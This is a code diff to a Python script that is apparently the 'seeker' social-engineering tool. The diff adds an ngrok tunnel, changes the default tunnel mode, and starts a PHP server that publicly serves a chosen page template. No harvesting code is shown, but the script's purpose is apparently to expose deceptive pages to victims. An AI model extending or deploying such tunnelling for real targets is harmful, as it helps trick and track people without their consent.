@@ -7,6 +7,7 @@ C = '\033[36m' # cyan
 W = '\033[0m'  # white
 
 from shutil import which
+import sys
 
 print(G + '[+]' + C + ' Checking Dependencies...' + W)
 pkgs = ['python3', 'pip3', 'php', 'ssh']
@@ -31,6 +32,8 @@ import json
 import argparse
 import requests
 import subprocess as subp
+from pyngrok import ngrok
+
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Optional )')
@@ -61,6 +64,8 @@ def banner():
 	print('\n' + G + '[>]' + C + ' Created By : ' + W + 'thewhiteh4t')
 	print(G + '[>]' + C + ' Version    : ' + W + version + '\n')
 
+
+
 def ver_check():
 	print(G + '[+]' + C + ' Checking for Updates.....', end='')
 	ver_url = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/version.txt'
@@ -82,9 +87,9 @@ def ver_check():
 
 def tunnel_select():
 	if tunnel_mode == None:
-		serveo()
-	elif tunnel_mode == 'manual':
 		print(G + '[+]' + C + ' Skipping Serveo, start your own tunnel service manually...' + W + '\n')
+	elif tunnel_mode == 'serveo':
+		serveo()
 	else:
 		print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
 		exit()
@@ -172,6 +177,13 @@ def serveo():
 
 def server():
 	print('\n' + G + '[+]' + C + ' Port : '+ W + str(port))
+	print('\n' + G + '[+]' + C + ' Starting NGROK Server......' + W, end='')
+	http_tunnel = ngrok.connect(8080)
+	print(C + '[' + G + ' Success ' + C + ']' + W)
+	http_tunnel = str(http_tunnel)
+	http_tunnel = http_tunnel.split("-")[0]
+	print('\n' + G + '[+]' + C + ' NGROK started: ' + http_tunnel)
+	time.sleep(10)
 	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
 	with open('logs/php.log', 'w') as phplog:
 		subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
